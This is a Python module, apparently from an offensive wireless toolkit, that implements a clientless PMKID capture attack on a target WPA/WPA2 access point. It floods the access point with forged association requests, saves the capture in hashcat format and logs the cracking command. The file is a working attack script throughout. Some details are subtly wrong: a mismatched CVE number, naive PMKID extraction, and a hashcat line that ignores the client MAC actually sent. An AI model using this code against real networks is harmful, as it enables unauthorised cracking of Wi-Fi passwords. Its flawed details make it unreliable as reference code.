"""
PMKID attack module
Capture PMKID for offline cracking (clientless attack)
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.core.packet import PacketHandler
from darknet.utils.constants import *
import time
from datetime import datetime


class PMKIDAttack(AttackModule):
    """
    PMKID capture attack (CVE-2018-16385)
    Captures PMKID without client for WPA/WPA2 cracking
    """

    def __init__(self):
        super().__init__(
            name="PMKID Attack",
            description="Capture PMKID for clientless WPA/WPA2 cracking",
            attack_type=ATTACK_PMKID
        )
        self.ap_mac = None
        self.ap_ssid = None
        self.channel = None
        self.pmkid_captured = False
        self.pmkid_data = None
        self.timeout = 60
        self.packet_handler = None

    def setup(self, **kwargs) -> bool:
        """
        Setup PMKID attack
        Args:
            interface: Wireless interface
            ap_mac: Target AP MAC address
            ap_ssid: Target AP SSID
            channel: Target channel
            timeout: Capture timeout in seconds
        """
        try:
            self.interface = kwargs.get('interface')
            self.ap_mac = kwargs.get('ap_mac')
            self.ap_ssid = kwargs.get('ap_ssid')
            self.channel = kwargs.get('channel')
            self.timeout = kwargs.get('timeout', 60)

            if not self.interface or not self.ap_mac:
                self.logger.error("Interface and AP MAC required")
                return False

            self.packet_handler = PacketHandler(self.interface)

            self.logger.info(f"PMKID attack configured:")
            self.logger.info(f"  Target AP: {self.ap_mac}")
            self.logger.info(f"  SSID: {self.ap_ssid}")
            self.logger.info(f"  Channel: {self.channel}")
            self.logger.info(f"  Timeout: {self.timeout}s")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _check_pmkid(self, packet):
        """Check if packet contains PMKID"""
        try:
            if packet.haslayer(Dot11) and packet.haslayer(EAPOL):
                # Check if from target AP
                if packet[Dot11].addr2 == self.ap_mac:
                    # Extract PMKID from EAPOL
                    if packet.haslayer(Raw):
                        data = bytes(packet[Raw])
                        # PMKID is in the first message of 4-way handshake
                        if len(data) > 16:
                            self.pmkid_captured = True
                            self.pmkid_data = data
                            self.logger.capture(f"PMKID captured from {self.ap_mac}!")
                            return True
        except Exception as e:
            self.logger.debug(f"Error checking PMKID: {e}")
        return False

    def _send_association_request(self):
        """Send association request to trigger PMKID"""
        try:
            # Generate random client MAC
            import random
            client_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

            # Create association request
            dot11 = Dot11(
                type=0,
                subtype=0,
                addr1=self.ap_mac,
                addr2=client_mac,
                addr3=self.ap_mac
            )

            # Build capabilities
            capability = 0x1104  # ESS, Short preamble, Short slot time

            # Association request frame
            assoc_req = Dot11AssoReq(cap=capability, listen_interval=5)

            # Add SSID
            essid = Dot11Elt(ID='SSID', info=self.ap_ssid or '', len=len(self.ap_ssid or ''))

            # Add supported rates
            rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')

            # RSN information for WPA2
            rsn = Dot11Elt(ID='RSNinfo', info=(
                b'\x01\x00'  # RSN Version
                b'\x00\x0f\xac\x04'  # Group Cipher Suite
                b'\x01\x00'  # Pairwise Cipher Suite Count
                b'\x00\x0f\xac\x04'  # Pairwise Cipher Suite
                b'\x01\x00'  # AKM Suite Count
                b'\x00\x0f\xac\x02'  # PSK
                b'\x00\x00'  # RSN Capabilities
            ))

            # Build complete packet
            pkt = RadioTap() / dot11 / assoc_req / essid / rates / rsn

            # Send packet
            sendp(pkt, iface=self.interface, verbose=False)
            self.packets_sent += 1

        except Exception as e:
            self.logger.error(f"Error sending association request: {e}")

    def run(self) -> dict:
        """Execute PMKID attack"""
        try:
            self.logger.attack(f"Starting PMKID capture attack on {self.ap_mac}")

            # Set channel if specified
            if self.channel:
                subprocess.run(
                    ['iw', 'dev', self.interface, 'set', 'channel', str(self.channel)],
                    check=True,
                    capture_output=True
                )

            # Setup packet capture
            self.packet_handler.add_callback(self._check_pmkid)
            self.packet_handler.start_capture()

            start_time = time.time()

            # Send association requests periodically
            while not self._stop_event.is_set() and not self.pmkid_captured:
                # Send association request
                self._send_association_request()

                # Check timeout
                if time.time() - start_time > self.timeout:
                    self.logger.warning("PMKID capture timeout")
                    break

                time.sleep(1)  # Send request every second

            self.packet_handler.stop_capture()

            if self.pmkid_captured:
                # Save PMKID to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"pmkid_{self.ap_mac.replace(':', '')}_{timestamp}.16800"

                # Hashcat format: PMKID*AP_MAC*CLIENT_MAC*SSID
                with open(filename, 'w') as f:
                    pmkid_hex = self.pmkid_data.hex()[:32]
                    line = f"{pmkid_hex}*{self.ap_mac.replace(':', '')}*{'02' * 6}*{self.ap_ssid.encode().hex()}\n"
                    f.write(line)

                self.logger.success(f"PMKID saved to {filename}")
                self.logger.info(f"Use: hashcat -m 16800 {filename} wordlist.txt")

                return {
                    'success': True,
                    'pmkid_captured': True,
                    'output_file': filename,
                    'ap_mac': self.ap_mac,
                    'ssid': self.ap_ssid
                }
            else:
                self.logger.warning("PMKID not captured")
                return {
                    'success': False,
                    'pmkid_captured': False,
                    'message': 'PMKID not captured - AP may be patched'
                }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        if self.packet_handler:
            self.packet_handler.stop_capture()

    def cleanup(self):
        """Cleanup resources"""
        if self.packet_handler:
            self.packet_handler.stop_capture()
